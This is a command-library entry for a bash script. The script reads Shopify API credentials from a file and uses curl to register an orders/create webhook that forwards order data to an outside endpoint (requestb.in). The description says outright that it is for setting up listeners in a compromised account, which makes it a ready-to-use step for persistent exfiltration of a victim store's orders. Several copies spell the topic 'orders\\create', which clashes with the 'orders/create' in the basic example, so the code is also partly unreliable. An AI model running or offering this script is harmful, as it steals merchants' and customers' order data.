---
data: |-
  #!/bin/bash
  creds=`cat ../creds`

  curl -X POST "$creds/admin/webhooks.json" \
    -H "Content-Type: application/json" \
    -d @- << EOD
  {
    "webhook": {
      "topic": "orders\\create",
      "address": "http://requestb.in/17m30us1",
      "format": "json"
    }
  }
  EOD

  printf "\n"
tags:
  - shopify
  - api
  - webhook
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:11.019Z'
id: 4c8c4934-b937-43af-b914-3caced1a830a
verified: false
validated: true
submitted: true
---
# create-shopify-webhook

## Command

```bash
#!/bin/bash
creds=`cat ../creds`

curl -X POST "$creds/admin/webhooks.json" \
  -H "Content-Type: application/json" \
  -d @- << EOD
{
  "webhook": {
    "topic": "orders\\create",
    "address": "http://requestb.in/17m30us1",
    "format": "json"
  }
}
EOD

printf "\n"
```

## Description

This bash script creates a Shopify webhook for the orders/create topic using API credentials from a file, directing payloads to an external endpoint in JSON format. Use it to set up event listeners in a compromised account.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| creds | Path to credentials file (shop.myshopify.com:api_key:password) | Yes |
| topic | Event topic (e.g., orders\\create, escaped) | Yes |
| address | External URL to receive payloads | Yes |
| format | Payload format (json) | Yes |

## Examples

### Basic Usage

```bash
#!/bin/bash
creds=`cat ../creds`

curl -X POST "$creds/admin/webhooks.json" \
  -H "Content-Type: application/json" \
  -d '{"webhook":{"topic":"orders/create","address":"https://example.com","format":"json"}}'
```

### Advanced Usage

```bash
# With heredoc for complex JSON
#!/bin/bash
creds=`cat ../creds`

curl -X POST "$creds/admin/webhooks.json" \
  -H "Content-Type: application/json" \
  -d @- << EOD
{
  "webhook": {
    "topic": "orders\\create",
    "address": "http://requestb.in/17m30us1",
    "format": "json"
  }
}
EOD
```

## Expected Output

JSON response like {"webhook":{"id":123456789,"topic":"orders/create","address":"http://requestb.in/17m30us1","format":"json",...}}, confirming creation.

## Related

- [[commands/list-shopify-webhooks]]
- [[procedures/Create-Shopify-Private-App-and-Webhook]]
